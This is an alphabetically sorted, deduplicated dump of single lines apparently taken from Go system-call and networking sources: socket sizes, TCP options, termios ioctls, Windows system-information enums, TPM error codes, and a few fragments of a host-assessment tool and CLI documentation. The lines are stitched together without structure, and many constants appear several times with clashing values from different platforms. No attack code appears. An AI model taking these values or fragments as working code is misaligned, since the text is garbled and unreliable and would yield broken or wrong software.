SizeofSockaddrDatalink = 0x80
SizeofSockaddrDatalink = 0xfc
SizeofSockaddrHCI       = 0x6
SizeofSockaddrIUCV      = 0x20
SizeofSockaddrInet4     = 0x10
SizeofSockaddrInet4    = 0x10
SizeofSockaddrInet4 = 16
SizeofSockaddrInet6     = 0x1c
SizeofSockaddrInet6    = 0x1c
SizeofSockaddrInet6    = 0x20
SizeofSockaddrInet6 = 28
SizeofSockaddrL2        = 0xe
SizeofSockaddrL2TPIP    = 0x10
SizeofSockaddrL2TPIP6   = 0x20
SizeofSockaddrLinklayer = 0x14
SizeofSockaddrNFC       = 0x10
SizeofSockaddrNFCLLCP = 0x58
SizeofSockaddrNFCLLCP = 0x60
SizeofSockaddrNetlink   = 0xc
SizeofSockaddrPPPoX     = 0x1e
SizeofSockaddrRFCOMM    = 0xa
SizeofSockaddrTIPC      = 0x10
SizeofSockaddrUnix      = 0x6a
SizeofSockaddrUnix      = 0x6e
SizeofSockaddrUnix     = 0x401
SizeofSockaddrUnix     = 0x6a
SizeofSockaddrUnix     = 0x6e
SizeofSockaddrVM        = 0x10
SizeofSockaddrVM        = 0xc
SizeofSockaddrXDP       = 0x10
SizeofTCPConnectionInfo = 0x70
SizeofTCPInfo           = 0x68
SizeofTCPInfo       = 0x68
SizeofTCPRepairOpt      = 0x8
SizeofTpacket2Hdr = 0x20
SizeofTpacket3Hdr = 0x30
SizeofTpacketHdr = 0x18
SizeofTpacketHdr = 0x20
SizeofTpacketStats   = 0x8
SizeofTpacketStatsV3 = 0xc
SizeofUcred             = 0xc
SizeofXSockbuf          = 0x18
SizeofXSocket           = 0x64
SizeofXVSockPgen        = 0x20
SizeofXucred            = 0x4c
SizeofXucred           = 0x50
SizeofXucred           = 0x58
SizeofXvsockpcb         = 0xa8
Sizeof_priv      uint32
Sjw          uint32
Sjw_max   uint32
Sleeping        uint64
Slen   uint8
Slice
Sn  [1024]byte
Sn  [1024]int8
Sn  [16]int8
Snaplen     uint32
Snaplen   uint32
Snaplen uint32
Snd_cwnd            uint32
Snd_cwnd       uint32
Snd_mss        uint32
Snd_sbbytes         uint32
Snd_ssthresh        uint32
Snd_ssthresh   uint32
Snd_wnd             uint32
Snd_wscale          uint8
So_error     uint16
So_incqlen   int16
So_linger    int16
So_oobmark   uint32
So_options   int16
So_pcb       uint32
So_pgid      int32
So_qlen      int16
So_qlimit    int16
So_rcv       XSockbuf
So_snd       XSockbuf
So_state     int16
So_timeo     int16
So_type      int16
So_uid       uint32
SockFilter
SockFprog) error {
Sockaddr       
SockaddrCANJ1939{
SockaddrCAN{
SockaddrCAN{Ifindex: index}
SockaddrIUCV{
SockaddrL2{
SockaddrLength int32
SockaddrNFCLLCP{
SockaddrNFC{
SockaddrPPPoE{
SockaddrRFCOMM{
SockaddrTIPC{
SockaddrVM{
SockaddrXDP{
SocketAddress) IP() net.IP {
SocketControlMessage) (
SocketType        int32
Socktype  int32
Softe     uint64
Softs              int32
Software.
Sogen uint64
Some code that works in kubernetes:
Some simplified code from 
SortFlags bool
Source Code Form
Source uint16
SourceSAP      uint8
Sp     uint64
Sp   uint64
Sp  uint64
Spare       [10]uint64
Spare       [2]int64
Spare       [4]uint32
Spare   [10]uint64
Spare   [2]uint32
Spare   [4]int32
Spare   [4]int64
Spare   [4]uint32
Spare   [5]int32
Spare   [5]int64
Spare  int32
Spare [12]uint64
Spare2      int64
Spare_char1 uint8
Spare_char2 uint8
Spares1     int16
Spares2     int16
Spec_dst [4]byte /
Speed           uint32
Speed         Speed
SpeedAny Speed = iota
SpeedFast
SpeedSlow
Spg            uint32
Split the output in name and description
Spsr uint32
Sr uint32
Src_fd      int64
Src_len  uint8
Src_length  uint64
Src_length uint64
Src_offset  uint64
Src_offset uint64
Srtt                uint32
Ss       uint64
Ss     int64
Ss     uint32
Ss_sysaddr  uint16
Ssap             uint8
Ssize    int32
Ssthresh  uint64
Ssthresh uint32
Ssthresh uint64
Stabil    int32
Stabil    int64
StandardBias int32
StandardDate Systemtime
StandardName [32]uint16
Start     uint32
Start     uint64
Start   int64
Start  int64
Start  uint32
Start  uint64
StartServiceCtrlDispatcher(serviceTable 
StartType        uint32
Starting_addr uint64
StartupInfo
StartupInfo) (err error) = GetStartupInfoW
StartupInfo) (err error) {
Stat_LE_t) (err error)
Stat_LE_t) (err error) = SYS___LSTAT_A
Stat_LE_t) (err error) = SYS___STAT_A
Stat_LE_t) (err error) {
Stat_LE_t) {
Stat_t) (err error)
Stat_t) (err error) = SYS_FSTAT64
Stat_t) (err error) = SYS_LSTAT64
Stat_t) (err error) = SYS_STAT64
Stat_t) (err error) {
Stat_t) convertFrom(old 
Stat_t) error {
Stat_t) {
State               uint8
State             uint32
State          uint8
State    uint32
State   uint16
State {
State) Assess() {
State) IsDebianLike() bool {
State) IsPackageInstalled(name string) bool {
State) error {
State) processDistro() {
State) processSudoers(hostname string) {
StateAction                     uint32
StateChange        DICS_STATE
StateData                       Handle
State{state{termios: 
State{}
Statfs_t) (err error)
Statfs_t) (err error) = SYS_FSTATFS64
Statfs_t) (err error) = SYS_STATFS64
Statfs_t) (err error) {
Statfs_t) convertFrom(old 
Stathz  int32
Stathz int32
Status        int32
Status       byte
Status       int32
Status       uint32
Status      NTStatus
Status      uint32
Status    int32
Status    uint32
Status   int32
Status   uint64
Status  uint32
Status  uint64
Status int32
Status_flags uint32
Statvfs_t) (err error)
Statvfs_t) (err error) = SYS_FSTATVFS
Statvfs_t) (err error) {
Statx_t) (err error)
Statx_t) (err error) {
Stbcnt    int32
Stbcnt    int64
StdErr        Handle
StdInput      Handle
StdOutput     Handle
Stderr = 2
Stderr = getStdHandle(STD_ERROR_HANDLE)
Stdin  = 0
Stdin  = getStdHandle(STD_INPUT_HANDLE)
Stdout = 1
Stdout = getStdHandle(STD_OUTPUT_HANDLE)
Steve Francia <steve.francia@gmail.com>
Stime     uint64
Stime    Timeval
Stime  int32
Stime  int64
Stime  uint32
Stime timeval_zos
Stopped         uint64
Store        Handle
String [16]byte
String() string
StringArray [1]
StringCount uint16
StringToUTF16(s)[0] }
Strioctl) SetInt(i int) {
StrucVersion     uint32
Subject              CertNameBlob
SubjectPublicKeyInfo CertPublicKeyInfo
SubjectUniqueId      CryptBitBlob
SubstituteNameLength uint16
SubstituteNameOffset uint16
SudoEntries   Sudoers
SudoEntry
SuffixOrigin       int32
SuggestFor
SuggestFor []string
Suggestions are automatic based on every subcommand registered and use an implementation of [Levenshtein distance](https://en.wikipedia.org/wiki/Levenshtein_distance). Every registered command that matches a minimum distance of 2 (ignoring case) will be displayed as a suggestion.
SuggestionsMinimumDistance int
SuiteMask         uint16
Swapin_count              uint64
Swapin_delay_total        uint64
Swpages            int32
Swpginuse          int32
Swpgonly           int32
Swtch              int32
Sxfert         uint16
Sync()
Sync() (err error)
Sync() = SYS_SYNC
Syncfs(fd int) (err error)
Syncreads   int64
Syncreads   uint64
Syncwrites  int64
Syncwrites  uint64
SysProcAttr: 
Syscall   int32
Syscall(SB)
Syscall6(SB)
Syscall9(SB)
Syscall_code uint32
Syscall_narg uint32
Syscalls           int32
Sysid  int32
Sysid  uint32
Sysinfo(info 
Sysinfo_t) (err error)
Sysinfo_t) (err error) {
Sysname    [65]byte
Sysname  [256]byte
Sysname  [257]byte
Sysname  [32]byte
System bool
System32
SystemAcpiAuditInformation
SystemAffinitizedInterruptProcessorInformation
SystemAitSamplingValue
SystemAllowedCpuSetsInformation
SystemBadPageInformation
SystemBasicInformation = iota
SystemBasicPerformanceInformation
SystemBigPoolInformation
SystemBootEnvironmentInformation
SystemBootGraphicsInformation
SystemBootLogoInformation
SystemBootMetadataInformation
SystemCallCountInformation
SystemCallTimeInformation
SystemCodeIntegrityInformation
SystemCodeIntegrityPolicyFullInformation
SystemCodeIntegrityPolicyInformation
SystemComPlusPackage
SystemCombinePhysicalMemoryInformation
SystemConsoleInformation
SystemContextSwitchInformation
SystemCoverageInformation
SystemCpuQuotaInformation
SystemCrashDumpStateInformation
SystemCurrentTimeZoneInformation
SystemDeviceDataEnumerationInformation
SystemDeviceDataInformation
SystemDeviceInformation
SystemDmaProtectionInformation
SystemDpcBehaviorInformation
SystemDynamicTimeZoneInformation
SystemEdidInformation
SystemElamCertificateInformation
SystemEmulationBasicInformation
SystemEmulationProcessorInformation
SystemEnergyEstimationConfigInformation
SystemEntropyInterruptTimingCallback
SystemEntropyInterruptTimingRawInformation
SystemErrorPortInformation
SystemExceptionInformation
SystemExtendServiceTableInformation
SystemExtendedHandleInformation
SystemExtendedProcessInformation
SystemFileCacheInformation
SystemFileCacheInformationEx
SystemFirmwareTableInformation
SystemFlagsInformation
SystemFullMemoryInformation
SystemFullProcessInformation
SystemHandleInformation
SystemHardwareSecurityTestInterfaceResultsInformation
SystemHotpatchInformation
SystemHypervisorDetailInformation
SystemHypervisorInformation
SystemHypervisorProcessorCountInformation
SystemImageFileExecutionOptionsInformation
SystemInterruptCpuSetsInformation
SystemInterruptInformation
SystemIsolatedUserModeInformation
SystemKernelDebuggerFlags
SystemKernelDebuggerInformation
SystemKernelDebuggerInformationEx
SystemLegacyDriverInformation
SystemLoadGdiDriverInSystemSpace
SystemLoadGdiDriverInformation
SystemLocksInformation
SystemLogicalProcessorAndGroupInformation
SystemLogicalProcessorInformation
SystemLookasideInformation
SystemLostDelayedWriteInformation
SystemLowPriorityIoInformation
SystemManufacturingInformation
SystemMemoryChannelInformation
SystemMemoryListInformation
SystemMemoryTopologyInformation
SystemMirrorMemoryInformation
SystemModuleInformation
SystemModuleInformationEx
SystemNativeBasicInformation
SystemNodeDistanceInformation
SystemNonPagedPoolInformation
SystemNumaAvailableMemory
SystemNumaProcessorMap
SystemNumaProximityNodeInformation
SystemObjectInformation
SystemObjectSecurityMode
SystemOfflineDumpConfigInformation
SystemPageFileInformation
SystemPageFileInformationEx
SystemPagedPoolInformation
SystemPagedPoolInformationEx
SystemPathInformation
SystemPerformanceInformation
SystemPerformanceTraceInformation
SystemPlatformBinaryInformation
SystemPoolTagInformation
SystemPortableWorkspaceEfiLauncherInformation
SystemPrefetchPatchInformation
SystemPrefetcherInformation
SystemPrioritySeperation
SystemProcessIdInformation
SystemProcessInformation
SystemProcessorBrandString
SystemProcessorCycleStatsInformation
SystemProcessorCycleTimeInformation
SystemProcessorFeaturesInformation
SystemProcessorIdleCycleTimeInformation
SystemProcessorIdleInformation
SystemProcessorInformation
SystemProcessorMicrocodeUpdateInformation
SystemProcessorPerformanceDistribution
SystemProcessorPerformanceInformation
SystemProcessorPerformanceInformationEx
SystemProcessorPowerInformation
SystemProcessorPowerInformationEx
SystemProcessorProfileControlArea
SystemQueryPerformanceCounterInformation
SystemRangeStartInformation
SystemRecommendedSharedDataAlignment
SystemRefTraceInformation
SystemRegisterFirmwareTableInformationHandler
SystemRegistryAppendString
SystemRegistryQuotaInformation
SystemRegistryReconciliationInformation
SystemRootSiloInformation
SystemScrubPhysicalMemoryInformation
SystemSecureBootInformation
SystemSecureBootPolicyFullInformation
SystemSecureBootPolicyInformation
SystemSessionBigPoolInformation
SystemSessionCreate
SystemSessionDetach
SystemSessionInformation
SystemSessionMappedViewInformation
SystemSessionPoolTagInformation
SystemSessionProcessInformation
SystemSingleModuleInformation
SystemSoftRebootInformation
SystemSpecialPoolInformation
SystemStackTraceInformation
SystemStatus [WSASYS_STATUS_LEN 
SystemStoreInformation
SystemSummaryMemoryInformation
SystemSuperfetchInformation
SystemSystemDiskInformation
SystemSystemPartitionInformation
SystemSystemPtesInformationEx
SystemThreadPriorityClientIdInformation
SystemThrottleNotificationInformation
SystemTimeAdjustmentInformation
SystemTimeOfDayInformation
SystemTimeSlipNotification
SystemTimeZoneInformation
SystemTpmBootEntropyInformation
SystemTrustedPlatformModuleInformation
SystemUnloadGdiDriverInformation
SystemVdmBopInformation
SystemVdmInstemulInformation
SystemVerifierAddDriverInformation
SystemVerifierCancellationInformation
SystemVerifierCountersInformation
SystemVerifierFaultsInformation
SystemVerifierInformation
SystemVerifierInformationEx
SystemVerifierRemoveDriverInformation
SystemVerifierThunkExtend
SystemVerifierTriageInformation
SystemVhdBootInformation
SystemVirtualAddressInformation
SystemVmGenerationCountInformation
SystemWatchdogTimerHandler
SystemWatchdogTimerInformation
SystemWow64SharedInformationObsolete
T0  uint64
T1  uint64
T2  uint64
T3  uint64
T4  uint64
T5  uint64
T6  uint64
TAB0                                        = 0x0
TAB0                                    = 0x0
TAB0                              = 0x0
TAB0                           = 0x0
TAB0                          = 0x0
TAB1                                    = 0x400
TAB1                             = 0x400
TAB1                             = 0x800
TAB1                          = 0x400
TAB1                          = 0x800
TAB2                                    = 0x800
TAB2                             = 0x1000
TAB2                             = 0x800
TAB2                          = 0x1000
TAB2                          = 0x800
TAB3                                    = 0x4
TAB3                              = 0x4
TAB3                             = 0x1800
TAB3                             = 0xc00
TAB3                           = 0x4
TAB3                          = 0x1800
TAB3                          = 0xc00
TABDLY                                  = 0xc04
TABDLY                            = 0x4
TABDLY                           = 0x1800
TABDLY                           = 0xc00
TABDLY                         = 0x4
TABDLY                        = 0x1800
TABDLY                        = 0xc00
TASKSTATS_CMD_ATTR_DEREGISTER_CPUMASK = 0x4
TASKSTATS_CMD_ATTR_MAX                      = 0x4
TASKSTATS_CMD_ATTR_PID                = 0x1
TASKSTATS_CMD_ATTR_REGISTER_CPUMASK   = 0x3
TASKSTATS_CMD_ATTR_TGID               = 0x2
TASKSTATS_CMD_ATTR_UNSPEC             = 0x0
TASKSTATS_CMD_GET                     = 0x1
TASKSTATS_CMD_MAX                           = 0x2
TASKSTATS_CMD_NEW                     = 0x2
TASKSTATS_CMD_UNSPEC                  = 0x0
TASKSTATS_GENL_VERSION                      = 0x1
TASKSTATS_TYPE_AGGR_PID               = 0x4
TASKSTATS_TYPE_AGGR_TGID              = 0x5
TASKSTATS_TYPE_MAX                          = 0x6
TASKSTATS_TYPE_NULL                   = 0x6
TASKSTATS_TYPE_PID                    = 0x1
TASKSTATS_TYPE_STATS                  = 0x3
TASKSTATS_TYPE_TGID                   = 0x2
TASKSTATS_TYPE_UNSPEC                 = 0x0
TASKSTATS_VERSION                           = 0xd
TBSIMP_E_BUFFER_TOO_SMALL                                                 Handle        = 0x80290200
TBSIMP_E_CLEANUP_FAILED                                                   Handle        = 0x80290201
TBSIMP_E_COMMAND_CANCELED                                                 Handle        = 0x8029020B
TBSIMP_E_COMMAND_FAILED                                                   Handle        = 0x80290211
TBSIMP_E_DUPLICATE_VHANDLE                                                Handle        = 0x80290206
TBSIMP_E_HASH_BAD_KEY                                                     Handle        = 0x80290205
TBSIMP_E_HASH_TABLE_FULL                                                  Handle        = 0x80290216
TBSIMP_E_INVALID_CONTEXT_HANDLE                                           Handle        = 0x80290202
TBSIMP_E_INVALID_CONTEXT_PARAM                                            Handle        = 0x80290203
TBSIMP_E_INVALID_OUTPUT_POINTER                                           Handle        = 0x80290207
TBSIMP_E_INVALID_PARAMETER                                                Handle        = 0x80290208
TBSIMP_E_INVALID_RESOURCE                                                 Handle        = 0x80290214
TBSIMP_E_LIST_NOT_FOUND                                                   Handle        = 0x8029020E
TBSIMP_E_LIST_NO_MORE_ITEMS                                               Handle        = 0x8029020D
TBSIMP_E_NOTHING_TO_UNLOAD                                                Handle        = 0x80290215
TBSIMP_E_NOT_ENOUGH_SPACE                                                 Handle        = 0x8029020F
TBSIMP_E_NOT_ENOUGH_TPM_CONTEXTS                                          Handle        = 0x80290210
TBSIMP_E_NO_EVENT_LOG                                                     Handle        = 0x8029021B
TBSIMP_E_OUT_OF_MEMORY                                                    Handle        = 0x8029020C
TBSIMP_E_PPI_NOT_SUPPORTED                                                Handle        = 0x80290219
TBSIMP_E_RESOURCE_EXPIRED                                                 Handle        = 0x80290213
TBSIMP_E_RPC_INIT_FAILED                                                  Handle        = 0x80290209
TBSIMP_E_SCHEDULER_NOT_RUNNING                                            Handle        = 0x8029020A
TBSIMP_E_TOO_MANY_RESOURCES                                               Handle        = 0x80290218
TBSIMP_E_TOO_MANY_TBS_CONTEXTS                                            Handle        = 0x80290217
TBSIMP_E_TPM_ERROR                                                        Handle        = 0x80290204
TBSIMP_E_TPM_INCOMPATIBLE                                                 Handle        = 0x8029021A
TBSIMP_E_UNKNOWN_ORDINAL                                                  Handle        = 0x80290212
TBS_E_ACCESS_DENIED                                                       Handle        = 0x80284012
TBS_E_BAD_PARAMETER                                                       Handle        = 0x80284002
TBS_E_BUFFER_TOO_LARGE                                                    Handle        = 0x8028400E
TBS_E_COMMAND_CANCELED                                                    Handle        = 0x8028400D
TBS_E_INSUFFICIENT_BUFFER                                                 Handle        = 0x80284005
TBS_E_INTERNAL_ERROR                                                      Handle        = 0x80284001
TBS_E_INVALID_CONTEXT                                                     Handle        = 0x80284004
TBS_E_INVALID_CONTEXT_PARAM                                               Handle        = 0x80284007
TBS_E_INVALID_OUTPUT_POINTER                                              Handle        = 0x80284003
TBS_E_IOERROR                                                             Handle        = 0x80284006
TBS_E_NO_EVENT_LOG                                                        Handle        = 0x80284011
TBS_E_OWNERAUTH_NOT_FOUND                                                 Handle        = 0x80284015
TBS_E_PPI_FUNCTION_UNSUPPORTED                                            Handle        = 0x80284014
TBS_E_PPI_NOT_SUPPORTED                                                   Handle        = 0x8028400C
TBS_E_PROVISIONING_INCOMPLETE                                             Handle        = 0x80284016
TBS_E_PROVISIONING_NOT_ALLOWED                                            Handle        = 0x80284013
TBS_E_SERVICE_DISABLED                                                    Handle        = 0x80284010
TBS_E_SERVICE_NOT_RUNNING                                                 Handle        = 0x80284008
TBS_E_SERVICE_START_PENDING                                               Handle        = 0x8028400B
TBS_E_TOO_MANY_RESOURCES                                                  Handle        = 0x8028400A
TBS_E_TOO_MANY_TBS_CONTEXTS                                               Handle        = 0x80284009
TBS_E_TPM_NOT_FOUND                                                       Handle        = 0x8028400F
TC(FLSH
TCFLSH                           = 0x20005407
TCFLSH                           = 0x2000741f
TCFLSH                           = 0x5407
TCFLSH                           = 0x540b
TCFLSH                        = 0x5407
TCFLSH                        = 0x540c
TCGET/ 
TCGETA                           = 0x40125401
TCGETA                           = 0x40147417
TCGETA                           = 0x5401
TCGETA                           = 0x5405
TCGETA                        = 0x5401
TCGETA                        = 0x5405
TCGETS                           = 0x40245408
TCGETS                           = 0x402c7413
TCGETS                           = 0x5401
TCGETS                           = 0x540d
TCGETS                          = 3 // not defined in ioctl.h -- zos golang only
TCGETS                        = 0x5401
TCGETS                        = 0x540d
TCGETS2                          = 0x402c540c
TCGETS2                          = 0x4030542a
TCGETS2                          = 0x802c542a
TCGETX                           = 0x5432
TCIFLUSH                                    = 0x0
TCIFLUSH                                = 0x1
TCIFLUSH                          = 0x1
TCIFLUSH                        = 0
TCIFLUSH                       = 0x1
TCIFLUSH                      = 0x0
TCIOFF                                      = 0x2
TCIOFF                                  = 0x3
TCIOFF                            = 0x3
TCIOFF                          = 2
TCIOFF                         = 0x3
TCIOFF                        = 0x2
TCIOFLUSH                                   = 0x2
TCIOFLUSH                               = 0x3
TCIOFLUSH                         = 0x3
TCIOFLUSH                       = 2
TCIOFLUSH                      = 0x3
TCIOFLUSH                     = 0x2
TCION                                       = 0x3
TCION                                   = 0x4
TCION                             = 0x4
TCION                           = 3
TCION                          = 0x4
TCION                         = 0x3
TCOFLUSH                                    = 0x1
TCOFLUSH                                = 0x2
TCOFLUSH                          = 0x2
TCOFLUSH                        = 1
TCOFLUSH                       = 0x2
TCOFLUSH                      = 0x1
TCOOFF                                      = 0x0
TCOOFF                                  = 0x1
TCOOFF                            = 0x1
TCOOFF                          = 0
TCOOFF                         = 0x1
TCOOFF                        = 0x0
TCOON                                       = 0x1
TCOON                                   = 0x2
TCOON                             = 0x2
TCOON                           = 1
TCOON                          = 0x2
TCOON                         = 0x1
TCPOPT)_/ 
TCPOPT_CC                               = 0xb
TCPOPT_CCECHO                           = 0xd
TCPOPT_CCNEW                            = 0xc
TCPOPT_EOL                                  = 0x0
TCPOPT_EOL                              = 0x0
TCPOPT_FASTOPEN                         = 0x22
TCPOPT_MAXSEG                               = 0x2
TCPOPT_MAXSEG                           = 0x2
TCPOPT_NOP                                  = 0x1
TCPOPT_NOP                              = 0x1
TCPOPT_SACK                                 = 0x5
TCPOPT_SACK                             = 0x5
TCPOPT_SACK_HDR                         = 0x1010500
TCPOPT_SACK_PERMITTED                       = 0x4
TCPOPT_SACK_PERMITTED                   = 0x4
TCPOPT_SACK_PERMIT_HDR                  = 0x1010402
TCPOPT_SIGNATURE                        = 0x13
TCPOPT_TIMESTAMP                            = 0x8
TCPOPT_TIMESTAMP                        = 0x8
TCPOPT_TSTAMP_HDR                           = 0x101080a
TCPOPT_TSTAMP_HDR                       = 0x101080a
TCPOPT_WINDOW                               = 0x3
TCPOPT_WINDOW                           = 0x3
TCP_24DAYS_WORTH_OF_SLOWTICKS = 0x3f4800
TCP_ABORT_THRESHOLD           = 0x11
TCP_ACLADD                    = 0x23
TCP_ACLBIND                   = 0x26
TCP_ACLCLEAR                  = 0x22
TCP_ACLDEL                    = 0x24
TCP_ACLDENY                   = 0x8
TCP_ACLFLUSH                  = 0x21
TCP_ACLGID                    = 0x1
TCP_ACLLS                     = 0x25
TCP_ACLSUBNET                 = 0x4
TCP_ACLUID                    = 0x2
TCP_ANONPRIVBIND              = 0x20
TCP_BBR_ACK_COMP_ALG           = 0x448
TCP_BBR_DRAIN_INC_EXTRA        = 0x43c
TCP_BBR_DRAIN_PG               = 0x42e
TCP_BBR_EXTRA_GAIN             = 0x449
TCP_BBR_IWINTSO                = 0x42b
TCP_BBR_LOWGAIN_FD             = 0x436
TCP_BBR_LOWGAIN_HALF           = 0x435
TCP_BBR_LOWGAIN_THRESH         = 0x434
TCP_BBR_MAX_RTO                = 0x439
TCP_BBR_MIN_RTO                = 0x438
TCP_BBR_ONE_RETRAN             = 0x431
TCP_BBR_PACE_CROSS             = 0x442
TCP_BBR_PACE_DEL_TAR           = 0x43f
TCP_BBR_PACE_PER_SEC           = 0x43e
TCP_BBR_PACE_SEG_MAX           = 0x440
TCP_BBR_PACE_SEG_MIN           = 0x441
TCP_BBR_PROBE_RTT_GAIN         = 0x44d
TCP_BBR_PROBE_RTT_INT          = 0x430
TCP_BBR_PROBE_RTT_LEN          = 0x44e
TCP_BBR_RACK_RTT_USE           = 0x44a
TCP_BBR_RECFORCE               = 0x42c
TCP_BBR_REC_OVER_HPTS          = 0x43a
TCP_BBR_RETRAN_WTSO            = 0x44b
TCP_BBR_RWND_IS_APP            = 0x42f
TCP_BBR_STARTUP_EXIT_EPOCH     = 0x43d
TCP_BBR_STARTUP_LOSS_EXIT      = 0x432
TCP_BBR_STARTUP_PG             = 0x42d
TCP_BBR_UNLIMITED              = 0x43b
TCP_BBR_USEDEL_RATE            = 0x437
TCP_BBR_USE_LOWGAIN            = 0x433
TCP_BPF_DELACK_MAX                         = 0x3eb
TCP_BPF_IW                                 = 0x3e9
TCP_BPF_RTO_MIN                            = 0x3ec
TCP_BPF_SNDCWND_CLAMP                      = 0x3ea
TCP_BPF_SYN                                = 0x3ed
TCP_BPF_SYN_IP                             = 0x3ee
TCP_BPF_SYN_MAC                            = 0x3ef
TCP_CA_NAME_MAX                = 0x10
TCP_CCALGOOPT                  = 0x41
TCP_CC_INFO                                 = 0x1a
TCP_CM_INQ                                  = 0x24
TCP_CONGCTL                       = 0x20
TCP_CONGESTION                              = 0xd
TCP_CONGESTION                 = 0x40
TCP_CONGESTION                = 0x25
TCP_CONNECTIONTIMEOUT                   = 0x20
TCP_CONNECTION_INFO                     = 0x106
TCP_CONN_ABORT_THRESHOLD      = 0x13
TCP_CONN_NOTIFY_THRESHOLD     = 0x12
TCP_COOKIE_IN_ALWAYS                        = 0x1
TCP_COOKIE_MAX                              = 0x10
TCP_COOKIE_MIN                              = 0x8
TCP_COOKIE_OUT_NEVER                        = 0x2
TCP_COOKIE_PAIR_SIZE                        = 0x20
TCP_COOKIE_TRANSACTIONS                     = 0xf
TCP_CORK                                    = 0x3
TCP_CORK                      = 0x18
TCP_CWND_DF                   = 0x16
TCP_CWND_IF                   = 0x15
TCP_DATA_AFTER_CLOSE           = 0x44c
TCP_DEFER_ACCEPT                            = 0x9
TCP_DELACK                     = 0x48
TCP_DELAY_ACK_FIN             = 0x2
TCP_DELAY_ACK_SYN             = 0x1
TCP_ENABLE_ECN                          = 0x104
TCP_EXCLBIND                  = 0x21
TCP_FASTKEEP                      = 0x80
TCP_FASTNAME                  = 0x101080a
TCP_FASTOPEN                                = 0x17
TCP_FASTOPEN                            = 0x105
TCP_FASTOPEN                   = 0x401
TCP_FASTOPEN_CONNECT                        = 0x1e
TCP_FASTOPEN_KEY                            = 0x21
TCP_FASTOPEN_MAX_COOKIE_LEN    = 0x10
TCP_FASTOPEN_MIN_COOKIE_LEN    = 0x4
TCP_FASTOPEN_NO_COOKIE                      = 0x22
TCP_FASTOPEN_PSK_LEN           = 0x10
TCP_FUNCTION_BLK               = 0x2000
TCP_FUNCTION_NAME_LEN_MAX      = 0x20
TCP_INFO                                    = 0xb
TCP_INFO                        = 0xb
TCP_INFO                       = 0x20
TCP_INIT_CWND                 = 0x15
TCP_INQ                                     = 0x24
TCP_KEEPALIVE                           = 0x10
TCP_KEEPALIVE                   = 0x8
TCP_KEEPALIVE                 = 0x8
TCP_KEEPALIVE_ABORT_THRESHOLD = 0x17
TCP_KEEPALIVE_THRESHOLD       = 0x16
TCP_KEEPCNT                                 = 0x6
TCP_KEEPCNT                             = 0x102
TCP_KEEPCNT                       = 0x400
TCP_KEEPCNT                       = 0x6
TCP_KEEPCNT                    = 0x400
TCP_KEEPCNT                   = 0x13
TCP_KEEPCNT                   = 0x23
TCP_KEEPIDLE                                = 0x4
TCP_KEEPIDLE                      = 0x100
TCP_KEEPIDLE                      = 0x3
TCP_KEEPIDLE                   = 0x100
TCP_KEEPIDLE                  = 0x11
TCP_KEEPIDLE                  = 0x22
TCP_KEEPINIT                      = 0x20
TCP_KEEPINIT                      = 0x7
TCP_KEEPINIT                   = 0x80
TCP_KEEPINTVL                               = 0x5
TCP_KEEPINTVL                           = 0x101
TCP_KEEPINTVL                     = 0x200
TCP_KEEPINTVL                     = 0x5
TCP_KEEPINTVL                  = 0x200
TCP_KEEPINTVL                 = 0x12
TCP_KEEPINTVL                 = 0x24
TCP_LINGER2                                 = 0x8
TCP_LINGER2                   = 0x1c
TCP_LOG                        = 0x22
TCP_LOGBUF                     = 0x23
TCP_LOGDUMP                    = 0x25
TCP_LOGDUMPID                  = 0x26
TCP_LOGID                      = 0x24
TCP_LOG_ID_LEN                 = 0x40
TCP_LSPRIV                    = 0x29
TCP_LUID                      = 0x20
TCP_MAXBURST                      = 0x4
TCP_MAXBURST                   = 0x4
TCP_MAXBURST                  = 0x8
TCP_MAXDF                     = 0x64
TCP_MAXHLEN                             = 0x3c
TCP_MAXHLEN                       = 0x3c
TCP_MAXHLEN                    = 0x3c
TCP_MAXIF                     = 0x64
TCP_MAXOLEN                             = 0x28
TCP_MAXOLEN                       = 0x28
TCP_MAXOLEN                    = 0x28
TCP_MAXSEG                                  = 0x2
TCP_MAXSEG                              = 0x2
TCP_MAXSEG                        = 0x2
TCP_MAXSEG                     = 0x2
TCP_MAXSEG                    = 0x2
TCP_MAXWIN                                  = 0xffff
TCP_MAXWIN                              = 0xffff
TCP_MAXWIN                        = 0xffff
TCP_MAXWIN                     = 0xffff
TCP_MAXWIN                    = 0xffff
TCP_MAXWINDOWSCALE            = 0xe
TCP_MAX_SACK                            = 0x4
TCP_MAX_SACK                      = 0x3
TCP_MAX_SACK                   = 0x4
TCP_MAX_SACK                  = 0x4
TCP_MAX_WINSHIFT                            = 0xe
TCP_MAX_WINSHIFT                        = 0xe
TCP_MAX_WINSHIFT                  = 0xe
TCP_MAX_WINSHIFT               = 0xe
TCP_MD5SIG                                  = 0xe
TCP_MD5SIG                        = 0x10
TCP_MD5SIG                        = 0x4
TCP_MD5SIG                     = 0x10
TCP_MD5SIG_EXT                              = 0x20
TCP_MD5SIG_FLAG_PREFIX                      = 0x1
TCP_MD5SIG_MAXKEYLEN                        = 0x50
TCP_MINMSS                              = 0xd8
TCP_MINMSS                        = 0x100
TCP_MINMSS                        = 0xd8
TCP_MINMSS                     = 0xd8
TCP_MIN_WINSHIFT                  = 0x5
TCP_MSS                                     = 0x200
TCP_MSS                                 = 0x200
TCP_MSS                           = 0x200
TCP_MSS                           = 0x218
TCP_MSS                        = 0x218
TCP_MSS                       = 0x218
TCP_MSS                       = 0x5b4
TCP_MSS_DEFAULT                             = 0x218
TCP_MSS_DESIRED                             = 0x4c4
TCP_NODELAY                                 = 0x1
TCP_NODELAY                             = 0x1
TCP_NODELAY                       = 0x1
TCP_NODELAY                     = 0x1
TCP_NODELAY                    = 0x1
TCP_NODELAY                   = 0x1
TCP_NODELAY = 1
TCP_NODELAYACK                = 0x14
TCP_NOOPT                               = 0x8
TCP_NOOPT                         = 0x8
TCP_NOOPT                      = 0x8
TCP_NOPUSH                              = 0x4
TCP_NOPUSH                        = 0x10
TCP_NOPUSH                        = 0x4
TCP_NOPUSH                     = 0x4
TCP_NOREDUCE_CWND_EXIT_FRXMT  = 0x19
TCP_NOREDUCE_CWND_IN_FRXMT    = 0x18
TCP_NOTENTER_SSTART           = 0x17
TCP_NOTIFY_THRESHOLD          = 0x10
TCP_NOTSENT_LOWAT                           = 0x19
TCP_NOTSENT_LOWAT                       = 0x201
TCP_NSTATES                       = 0xb
TCP_OPT                       = 0x19
TCP_PCAP_IN                    = 0x1000
TCP_PCAP_OUT                   = 0x800
TCP_QUEUE_SEQ                               = 0x15
TCP_QUICKACK                                = 0xc
TCP_RACK_EARLY_RECOV           = 0x423
